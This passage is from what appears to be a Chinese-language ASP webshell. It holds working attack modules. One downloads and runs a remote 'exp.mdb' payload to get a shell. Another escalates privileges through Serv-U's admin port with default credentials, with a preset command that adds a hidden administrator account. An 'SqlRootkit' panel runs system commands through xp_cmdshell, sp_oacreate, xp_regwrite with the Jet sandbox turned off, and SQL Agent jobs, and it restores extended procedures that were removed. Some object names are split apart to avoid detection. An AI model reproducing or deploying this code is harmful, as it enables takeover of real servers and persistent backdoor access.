		Set theFolder = saX.NameSpace(thePath)
		
		For Each item In theFolder.Items
			If item.IsFolder = True Then
				saTreeForMdb item.Path, rs, stream
			 Else
				If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
					rs.AddNew
					rs("thePath") = Mid(item.Path, 4)
					stream.LoadFromFile(item.Path)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next

		Set theFolder = Nothing
	End Sub

%>

<%if request("ado")="newado" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "没有登陆"
%>
<%else%>

<style>
body{font-family: 宋体;   font-size: 10pt}
table{ font-family: 宋体; font-size: 9pt }
a{ font-family: 宋体; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: 宋体; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<script type="text/JavaScript">
<!--

function MM_goToURL() { //v3.0
  var i, args=MM_goToURL.arguments; document.MM_returnValue = false;
  for (i=0; i<(args.length-1); i+=2) eval(args[i]+".location='"+args[i+1]+"'");
}
//-->
</script>
<form name="f1" action="">
<table width="331" border="0" align="center">
    <td colspan="2"><input type="hidden" name="ado" value="newado">
 <label>
下载EXP
   <input type="radio" name="mact" value="downexp" checked/>
 </label>
        <label>
　　运行EXP
        <input type="radio" name="mact" value="runexp" onclick="javascript:alert('执行后将得到22端口的SHELL');MM_goToURL('parent','?ado=newado&mact=runexp');return document.MM_returnValue"/>
      </label></td>
    </tr>
  <tr>
    <td width="154"><input name="urlexp" type="text" value="http://www.xxx.com/exp.mdb" size="25"></td>
    <td width="167">

        <input type="submit" value="提交"></td>
  </tr>
</table>
</form>





<%
if request("mact")="downexp" then 
if request("urlexp")<>"" then
if instr(lcase(request("urlexp")),"exp.mdb")=0 then
response.write "<script>alert('下载的文件名必须为exp.mdb');history.back();</script>"
end if
if left(lcase(trim(request("urlexp"))),7)<>"http://" then
response.write "<script>alert('请填入url的正确格式http://');history.back();</script>"
end if
GetRemoteFiels1 request("urlexp"),server.mappath("."),"exp"
response.write "<script>alert('下载成功')</script>"
else
response.write "<script>alert('请输入下载地址');history.back();</script>"
end if
end if
if request("mact")="runexp" then
	dim conn
	dim connstr
	dim db
	db="exp.mdb"
	set conn=server.createobject("ADODB.Connection")
	connstr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Server.MapPath(""&db&"")
	conn.open connstr
	'conn.close
	'set conn=nothing
end if
end if
%>

<%
Function GetRemoteFiels1(RemotePath, LocalPath, FileName)
Dim strBody
Dim FilePath

    On Error Resume Next

    '取得流
strBody = GetBody1(RemotePath)
'取得保存的文件名
if Right(LocalPath, 1) <> "\" then LocalPath = LocalPath & "\"
FilePath = LocalPath & GetFileName1(RemotePath, FileName)
'保存文件
if SaveToFile1(strBody, FilePath) = true and err.Number = 0 then
     GetRemoteFiles = true
else
     GetRemoteFiles = false
end if

End Function

'远程获取内容
Function GetBody1(url) 
Dim Retrieval
    '建立XMLHTTP对象
    Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
    With Retrieval 
        .Open "Get", url, False, "", "" 
        .Send 
        GetBody = .ResponseBody
    End With 
    Set Retrieval = Nothing 
End Function

'重组文件名
Function GetFileName1(RemotePath, FileName1)
Dim arrTmp
Dim strFileExt
    arrTmp = Split(RemotePath, ".")
strFileExt = arrTmp(UBound(arrTmp))
    GetFileName = FileName1 & "." & strFileExt
End Function

'将流内容保存为文件
Function SaveToFile1(Stream1, FilePath1)
Dim objStream

    On Error Resume Next

    '建立ADODB.Stream对象，必须要ADO 2.5以上版本
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1  '以二进制模式打开
    objStream.Open
    objstream.write Stream1
    objstream.SaveToFile FilePath1, 2
    objstream.Close()
    '关闭对象，释放资源
    Set objstream = Nothing

if err.Number <> 0 then
     SaveToFile = false
else
     SaveToFile = true
end if
End Function
%>
<% end if %>

<%if request("su")="su" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "没有登陆"
%>
<%else%>
<% 
Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
dim action
action=request("action")
if  not isnumeric(action) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
   f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=eviloctal|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsereviloctaloginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case action
case 1
    set a=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    a.open "GET", "http://127.0.0.1:" & port & "/eviloctal/upadmin/s1",True, "", ""
    a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
    set session("a")=a
%>
<form method="post" name="eviloctal">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="2"></form>
<script language="javascript">
document.write('<center>正在连接 127.0.0.1:<%=port%>,使用用户名: <%=user%>,口令：<%=pass%>...<center>');
setTimeout("document.all.eviloctal.submit();",4000);
</script>
<%
case 2
    set b=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    b.open "GET", "http://127.0.0.1:" & ftpport & "/eviloctal/upadmin/s2", True, "", ""
    b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
   set session("b")=b
%>
<form method="post" name="eviloctal">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="3"></form>
<script language="javascript">
document.write('<center>正在提升权限,请等待...,<center>');
setTimeout("document.all.eviloctal.submit();",4000);
</script>
<%
case 3
    set c=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    c.open "GET", "http://127.0.0.1:" & port & "/eviloctal/upadmin/s3", True, "", ""
    c.send loginuser & loginpass & mt & deldomain & quit
    set session("c")=c
%>
<center>提权完毕,已执行了命令：<br><font color=red><%=cmd%></font><br><br>
</center>

<%
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
%>
<center><form method="post" name="eviloctal">
<table width="494" height="163" border="1" cellpadding="0" cellspacing="1" bordercolor="#666666">
  <tr align="center" valign="middle">
    <td colspan="2">Serv-U 提升权限 ASP版</td>
  </tr>
  <tr align="center" valign="middle">
    <td width="100">用户名:</td>
    <td width="379"><input name="u" type="text" id="u" value="LocalAdministrator"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>口　令：</td>
    <td><input name="p" type="text" id="p" value="#l@$ak#.lk;0@P"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>端　口：</td>
    <td><input name="port" type="text" id="port" value="43958"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>系统路径：</td>
    <td><input name="f" type="text" id="f" value="<%=f%>" size="8"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>命　令：</td>
    <td><input name="c" type="text" id="c" value="cmd /c net user ttfct ttfct /add & net localgroup administrators ttfct /add" size="50"></td>
  </tr>
 
  <tr align="center" valign="middle">
    <td colspan="2"><input type="submit" name="Submit" value="提交">　
      <input type="reset" name="Submit2" value="重置">
      <input name="action" type="hidden" id="action" value="1"></td>
  </tr>
</table></form></center>
<% end select
function Gpath()
on error resume next
    err.clear
    set f=Server.CreateObject("Scrip"&sdt&"ting.FileSy"&sds&"stemObject")
    if err.number>0 then
	gpath="c:"
        exit function
    end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function GName() 
If request.servervariables("SERVER_PORT")="80" Then 
GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
Else 
GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
End If 
End Function 
%>
<% end if %>
<% end if %>

<%if request("sql")="yes" then%>
<%
if Session(m & "userPassword")<>userPassword then
response.write "没有登陆"
%>
<%else%>
<%on error resume next%>
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>SqlRootkit </title>
<style>
body{font-family: 宋体;   font-size: 10pt}
table{ font-family: 宋体; font-size: 9pt }
a{ font-family: 宋体; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: 宋体; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
</head> 
<%
if session("login")="" then
                           response.write "<center><font color=red>没有登陆</font></center><br>"
			   else response.write "<center><font color=red>已经登陆</font></center><br>"
end if
                           response.write "<center><a href="&Request.ServerVariables("URL")&"?sql=yes&action=logout><font color=black>退出登陆</font></a></center><br>"
%>
<%
If request("action")="login" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & request.Form("server") & "," & request.Form("port") & ";Password=" & request.Form("pass") & ";UID=" & request.Form("name")
                       if err.number=-2147467259 then 
                       response.write "<script>alert('数据源连接错误');history.back();</script>"
                       response.end
                       elseif err.number=-2147217843 then
                       response.write "<script>alert('用户名密码错误错误');history.back();</script>"
                       response.end
                       elseif err.number=0 then
                       strQuery="select @@version"
		       set recResult = adoConn.Execute(strQuery)
		       If instr(recResult(0),"NT 5.0") then
		       response.write "<font color=red>Windows 2000系统</font><br>"
                       session("system")="2000"
                       elseif instr(recResult(0),"NT 5.1")  then
                       response.write "<font color=red>Windows XP系统</font><br>"
                       session("system")="xp"
                       elseif instr(recResult(0),"NT 5.2")  then
                       response.write "<font color=red>Windows 2003系统</font><br>"
                       session("system")="2003"
                       else
                       response.write "<font color=red>其他系统</font><br>"
                       session("system")="no"
                       end if
                       strQuery="SELECT IS_SRVROLEMEMBER('sysadmin')"
		       set recResult = adoConn.Execute(strQuery)
                       if recResult(0)=1 then
                       response.write "<font color=red>恭喜！Sql Server最高权限</font><br>"
                       session("pri")=1
                       else
                       response.write "<font color=red>郁闷，权限不够估计不能执行命令！</font><br>"
                       session("pri")=0
                       end if              
		       session("login")="yes"
		       session("name")=request.Form("name")
		       session("pass")=request.Form("pass")
		       session("server")=request.Form("server")
		       session("port")=request.Form("port")
                       end if

elseif request("action")="test"  then
                       if session("login")<>"" then
                       if session("system")="2000" then
                       response.write "<font color=red>Windows 2000系统</font><br>"
                       elseif session("system")="xp" then
                       response.write "<font color=red>Windows XP系统</font><br>"
                       elseif session("system")="2003" then
                       response.write "<font color=red>Windows 2003系统</font><br>"
                       else
                       response.write "<font color=red>其他操作系统</font><br>"
                       end if
                       if session("pri")=1 then
                       response.write "<font color=red>恭喜！Sql Server最高权限</font><br>"
                       else 
                       response.write "<font color=red>郁闷，权限不够估计不能执行命令！</font><br>"
                       end if
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")        

                       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then
		       session("XP_cmdshell")=1 
		       response.write "<font color=red>XP_cmdshell............. 存在!</font>"
                       else
		       session("XP_cmdshell")=0 
		       response.write "<font color=red>XP_cmdshell............. 不存在!</font>"
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='sp_oacreate'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>sp_oacreate............. 存在!</font>"
		       session("sp_oacreate")=1
                       else 
		       response.write "<br><font color=red>sp_oacreate............. 不存在!</font>"
                       session("sp_oacreate")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_regwrite'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_regwrite............. 存在!</font>"
		       session("xp_regwrite")=1
                       else 
		       response.write "<br><font color=red>xp_regwrite............. 不存在!</font>"
		       session("xp_regwrite")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_servicecontrol'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_servicecontrol 存在!</font>"
		       session("xp_servicecontrol")=1
                       else 
		       response.write "<br><font color=red>xp_servicecontrol 不存在!</font>"
		       session("xp_servicecontrol")=0
                       End if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?sql=yes&action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if 

elseif request("action")="cmd" then
                       if session("login")<>"" then
                       if session("pri")=1 then
		       If request("tool")="XP_cmdshell" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       end if 
		       		       
                       elseif request("tool")="sp_oacreate" then 
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'WScri"&T&"pt.She"&T&"ll',@o out exec sp_oamethod @o,'run',NULL,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);"
		       adoConn.Execute(strQuery)
                       strQuery = "select * from jnc"
		       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
		       Response.Write "利用"&request("tool")&"扩展执行"	
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];declare @o int exec sp_oacreate 'WScri"&T&"pt.She"&T&"ll',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"
 		       adoConn.Execute(strQuery)
		       End if

                       elseif request("tool")="xp_regwrite" then
                       if session("system")="2000" then
                       path="c:\winnt\system32\ias\ias.mdb"
                       else
                       path="c:\windows\system32\ias\ias.mdb"
                       end if
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then
		       cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&cmd&")');"
                       adoConn.Execute(strQuery)
		       strQuery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);"
		       set recResult = adoConn.Execute(strQuery)
		       strQuery="select * from [jnc];"
                       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
                       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
		       adoConn.Execute(strQuery)
		       End if

		       elseif request("tool")="sqlserveragent" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")

		       If request.form("cmd")<>"" Then
                       if session("sqlserveragent")=0 then
                       strQuery = "exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';"
                       adoConn.Execute(strQuery)
                       session("sqlserveragent")=1
                       end if

		       strQuery = "use msdb CREATE TABLE [jncsql](ResultTxt nvarchar(1024) NULL) exec sp_delete_job null,'x' exec sp_add_job 'x' exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c "&request.form("cmd")&"' exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';"
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                    
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "利用"&request("tool")&"扩展执行"
                       Response.Write request.form("cmd") 
                       Response.Write vbcrf
                       Response.Write "此扩展无回显，建议通过重定向查看命令结果"
                       Response.Write "</textarea>"
		       strQuery = "use msdb drop table [jncsql];"
                       adoConn.Execute(strQuery)
                       End if
                       elseif request("tool")="" then 
                       response.write "<script>alert('选择你要使用的扩展')</script>"
                       end if
                       else
                       response.write "<script>alert('权限不够哦！')</script>"
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if

elseif request("action")="resume" then
                       if session("login")<>"" then
                       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       if session("xp_cmdshell")=0 then
                       strQuery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复xp_cmdshell</font>"
                       elseif session("sp_OACreate")=0 then
		       strQuery="dbcc addextendedproc ('sp_OACreate','odsole70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复sp_OACreate</font>"
		       elseif session("xp_regwrite")=0 then
		       strQuery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>已经尝试恢复xp_regwrite</font>"	
		       else response.write "<font color=red>恭喜！组件齐全</font>"	
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if 	
                                
elseif request("action")="sql" then
                       if session("login")<>"" then
		       If request.form("sql")<>"" then
                       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       strQuery=request.form("sql")
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "执行SQL语句:"
                       Response.Write request.form("sql") 
                       Response.Write strResult
                       Response.Write "</textarea>"
                       end if
                       else 
                       response.write "<script>alert('操作超时，重新登陆！')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>登陆超时</font>"
                       response.end
                       end if

elseif request("action")="logout" then
                       set adoConn=nothing
                       session("login")=""
                       session("name")=""
                       session("pass")=""
                       session("server")=""
                       session("port")=""
                       session("system")=""
                       session("pri")=""		              
end if
%>
<%
if session("login")="" then
                           response.write "<center>"
			   response.write "<form name=form method=POST action=?sql=yes&actoin=login>"
			   response.write "<p>SQL用户名："
			   response.write "<input name=name type=text id=name value="&session("name")&">"
 		           response.write "  SQL密码："
			   response.write "<input name=pass type=password id=pass value="&session("pass")&">"
			   response.write "<p>SQL服务器："
			   response.write "<input name=port type=text id=server value=127.0.0.1>"
 		           response.write "  SQL端口："
			   response.write "<input name=port type=text id=port value=1433>"
                           response.write "<p>"
			   response.write "  <input name=action type=submit value=login>"
			   response.write "</form>"
                           response.write "</center>"

else       
                           response.write "<center>"
                           response.write "<form name=form method=POST action=?sql=yes&actoin=test>"
			   response.write "<p>组件检测："
			   response.write "  <input name=action type=hidden value=test>"
			   response.write "  <input type=submit value=检测组件>"
			   response.write "</form>"
            
                           response.write "<form name=form method=POST action=?sql=yes&actoin=resume>"
			   response.write "<p>组件恢复："
			   response.write "  <input name=action type=hidden value=resume>"
			   response.write "  <input type=submit value=恢复组件>"
			   response.write "</form>"
  
		           response.write "<form name=form method=POST action=?sql=yes&actoin=cmd>"
			   response.write "<p>系统命令："
			   response.write "  <input name=cmd type=text>"
			   response.write "<select name='tool' ><option value=''>----请选择运行程序的组件----</option><option value=XP_cmdshell>XP_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option><option value=sqlserveragent>sqlserveragent</option></option></select>"
			   response.write "  <input name=action type=hidden value=cmd>"
			   response.write "  <input type=submit value=执行>"
			   response.write "</form>"
		           response.write "<form name=form1 method=POST action=?sql=yes&actoin=sql>"
			   response.write "<p>执行语句："
			   response.write "   <input name=sql type=text>"
			   response.write "  <input name=action type=hidden value=sql>"
			   response.write "  <input type=submit value=执行>"			   
			   response.write "</form>"
                           response.write "</center>"


                           
end if
%>
<br>
<br>
<br>
<br="fname.value=file1.value"> 
</td></tr> 
</table> 
</form> 
</body> 
</html>

<%end if%>
<% end if %>

<%if request("kill")="yes" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "没有登陆"
%>
<%else%>
<%
	if request.QueryString("act")<>"scan" then
%>
				<form action="?kill=yes&act=scan" method="post">
				<b>INPUT THE PATH：</b>
				<input name="path" type="text" style="border:1px solid #999" value="." size="30" />
				<br>
				<br>
				<br>
				<input type="submit" value=" SCAN NOW " style="background:#fff;border:1px solid #999;padding:2px 2px 0px 2px;margin:4px;border-width:1px 3px 1px 3px" />
				</form>
<%
else

Server.ScriptTimeout = 600
DimFileExt = "asp,cer,asa,cdx"
Dim Report, Sun, SumFiles, SumFolders

	Sun = 0
	SumFiles = 0
	SumFolders = 1
	requestPath = request.Form("path")
	if requestPath = "" or InStr(requestPath,"..\") then
		response.Write("No Hack")
		response.End()
	end if
	timer1 = timer
	if requestPath = "\" then
		TmpPath = Server.MapPath("\")
	elseif requestPath = "." then
		TmpPath = Server.MapPath(".")
	else
		TmpPath = Server.MapPath("\") & "\" & requestPath
	end if
	Call ShowAllFile(TmpPath)
%>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="CContent">
  <tr>
    <th>EVAL THINGS
  </tr>
  <tr>
    <td class="CPanel" style="padding:5px;line-height:170%;clear:both;font-size:12px">
        <div id="updateInfo" style="background:ffffe1;border:1px solid #89441f;padding:4px;display:none"></div>
SCANED FILES <font color="#FF0000"><%=SumFolders%></font>，FILES <font color="#FF0000"><%=SumFiles%></font>，SPECIAL FILES &nbsp;<font color="#FF0000"><%=Sun%></font>
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	 <tr>
		 <td valign="top">
			 <table width="100%" border="1" cellpadding="0" cellspacing="0" style="padding:5px;line-height:170%;clear:both;font-size:12px">
			 <tr>
			   <td width="20%">PATH</td>
			   <td width="20%">CODES</td>
			   <td width="40%">DESCRIPTION</td>
			   <td width="20%">CREATE/MIDIFY TIME</td>
			   </tr>
		     <p>
			 <%=Report%>
			 <br/></p>
			 </table></td>
	 </tr>
	</table>
</td></tr></table>
<%
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
response.write "<br><font size=""2"">COSTED"&thetime&" MI-SECONDS</font>"
	end if
end if
end if

%>
</body>
</html>
<%
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function

Function GetDateModify(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set fso = nothing
	GetDateModify = s
End Function

Function GetDateCreate(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set fso = nothing
	GetDateCreate = s
End Function

Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
%>
<%
Sub ShowAllFile(Path)
	If Not Response.IsClientConnected Then Response.End()
	Set FSO = CreateObject("Scripting.FileSystemObject")
	if not fso.FolderExists(path) then exit sub
	Set f = FSO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(FSO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set FSO = Nothing
End Sub

Sub ScanFile(FilePath, InFile)
	If InFile <> "" Then
		Infiles = "<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>文件包含执行</font>"
	End If
	temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
	on error resume next
	Set tStream = Server.CreateObject("ADODB.Stream")
	tStream.type = 1
	tStream.mode = 3
	tStream.open
	tStream.Position=0
